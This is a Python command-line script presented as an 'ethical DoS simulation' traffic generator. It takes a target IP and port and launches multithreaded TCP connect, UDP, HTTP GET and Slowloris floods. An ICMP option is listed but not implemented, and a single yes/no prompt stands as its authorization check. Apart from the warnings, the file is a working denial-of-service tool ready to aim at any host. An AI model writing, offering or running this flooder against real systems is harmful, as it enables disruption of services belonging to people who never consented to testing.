#!/usr/bin/env python3
"""
Controlled Traffic Generator
A tool for generating network flood traffic to conduct ethical DoS simulation and resilience testing.
"""

import socket
import random
import time
import threading

def run():
    print("\033[92m" + "="*70)
    print("           CONTROLLED TRAFFIC GENERATOR - DoS Simulation")
    print("="*70 + "\033[0m\n")
    
    print("\033[91m[!] CRITICAL WARNING: Use only for authorized testing!\033[0m")
    print("\033[91m[!] Unauthorized DoS attacks are illegal.\033[0m\n")
    
    target = input("\033[97m[?] Enter target IP: \033[0m").strip()
    port = input("\033[97m[?] Enter target port: \033[0m").strip()
    
    if not target or not port.isdigit():
        print("\033[91m[!] Invalid target or port.\033[0m")
        return
    
    port = int(port)
    
    print("\n\033[97m[*] Traffic Types:\033[0m")
    print("  [1] TCP SYN Flood")
    print("  [2] UDP Flood")
    print("  [3] ICMP Flood")
    print("  [4] HTTP Flood")
    print("  [5] Slowloris Attack")
    
    attack_type = input("\n\033[95m[?] Select traffic type: \033[0m").strip()
    
    threads_num = input("\033[97m[?] Number of threads (1-100): \033[0m").strip()
    threads_num = int(threads_num) if threads_num.isdigit() and 1 <= int(threads_num) <= 100 else 10
    
    confirm = input("\n\033[93m[?] Confirm you are authorized to test this target (yes/no): \033[0m").strip().lower()
    if confirm != 'yes':
        print("\033[91m[!] Attack cancelled.\033[0m")
        return
    
    attack_running = True
    packets_sent = [0]
    
    def tcp_flood():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\n\r\n")
                packets_sent[0] += 1
                s.close()
            except:
                pass
    
    def udp_flood():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                import os
                payload = os.urandom(1024)
                s.sendto(payload, (target, port))
                packets_sent[0] += 1
            except:
                pass
    
    def http_flood():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target}\r\n\r\n"
                s.send(request.encode())
                packets_sent[0] += 1
                s.close()
            except:
                pass
    
    def slowloris():
        while attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {random.randint(0, 2000)}\r\n".encode())
                packets_sent[0] += 1
                time.sleep(15)
                s.close()
            except:
                pass
    
    print(f"\n\033[92m[*] Starting traffic generation with {threads_num} threads...\033[0m")
    print("\033[93m[*] Press Ctrl+C to stop\033[0m\n")
    
    try:
        threads = []
        
        for i in range(threads_num):
            if attack_type == '1':
                t = threading.Thread(target=tcp_flood)
            elif attack_type == '2':
                t = threading.Thread(target=udp_flood)
            elif attack_type == '4':
                t = threading.Thread(target=http_flood)
            elif attack_type == '5':
                t = threading.Thread(target=slowloris)
            else:
                print("\033[91m[!] Invalid attack type.\033[0m")
                return
            
            t.daemon = True
            t.start()
            threads.append(t)
        
        while True:
            print(f"\r\033[97m[*] Packets sent: {packets_sent[0]}\033[0m", end='', flush=True)
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n\n\033[92m[*] Stopping traffic generation...\033[0m")
        attack_running = False
        time.sleep(2)
        print(f"\033[92m[*] Total packets sent: {packets_sent[0]}\033[0m")
    
    except Exception as e:
        print(f"\n\033[91m[!] Error: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
